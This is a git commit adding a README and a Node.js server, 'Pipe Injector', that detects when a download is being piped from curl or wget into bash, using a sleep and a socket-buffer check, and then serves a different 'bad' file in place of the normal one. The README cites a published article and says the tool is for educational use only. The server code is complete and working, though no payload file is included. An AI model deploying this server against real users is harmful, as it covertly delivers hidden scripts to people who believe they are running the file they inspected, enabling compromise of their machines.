eb7feb6affb788d956245636f1a0c6b882b3b903
Myles Johnson <myles.s.johnson@gmail.com>
2017-02-11 13:15:27 -0500

    Inital full commit

--- README.md
+++ README.md
@@ -1,2 +1,15 @@
-# Pipe-Injector-
-Node.js script that can detect when "curl ... | bash" is being used and serve a different file than normal
+Pipe Injector
+=============
+Node.js script that can detect when "curl ... | bash" is being used and serve a different file than normal. This is an implementation of this article https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/
+
+Usage
+-----
+The first 4 lines of injector.js are the settings used to configure the program:
+* initalFile is the file sent regardless of good or bad. It must be set to a file in it that has at least a `sleep` inside. I've found 3 seconds to work, but other delays may be necessary.
+* goodFile is the file served if piping is not detected.
+* badFile is the file served if piping is detected.
+* Port is what port number to bind the HTTP server on
+
+Warning
+-------
+This program is created only for educational purposes only. Do not use this on anyone without their informed consent.
---
+++ injector.js
@@ -0,0 +1,51 @@
+const initalFile = "myinitialfile";
+	  goodFile = "myfile";
+	  badFile = "mybadfile";
+	  port = 8080;
+
+const http = require('http'),
+	  fs = require('fs');
+
+function handleRequest(request, response){
+	// Don't even bother testing if it's being piped if the Useragent isn't curl/Wget
+	const ua = request.headers['user-agent']
+	if(!(ua.includes("Wget") || ua.includes("curl"))) {
+		var stream = fs.createReadStream(goodFile);
+		stream.pipe(response);
+		console.log("Not curl/wget, Good Sent");
+		return;
+	}
+
+	// Send the inital base file that contains a delay.
+	// Strange bug occurs when you leave it as a buffer, not entirely sure why
+	const inital = fs.readFileSync(initalFile).toString();
+	response.write(inital);
+
+	// Send padding to the client to try to fill their recieving socket buffer.
+	// This will cause the server side socket buffer to fill, which we detect.
+	var bash = false;
+	for (var i = 0; i < 40; i++) {
+		response.write(padding);
+		if(request.socket.bufferSize > 0) {
+			console.log(request.socket.bufferSize);
+			bash = true;
+			break;
+		}
+	}
+
+	// If our buffer filled, we know they're piping it into bash, send the bad payload
+	if(bash) {
+		var stream = fs.createReadStream(badFile);
+		stream.pipe(response);
+		console.log("Bad Sent");
+	} else {
+		var stream = fs.createReadStream(goodFile);
+		stream.pipe(response);
+		console.log("Good Sent");
+	}
+}
+
+const padding = '\0'.repeat(87380);
+http.createServer(handleRequest).listen(port, function() {
+	console.log("Server started on port " + port);
+});
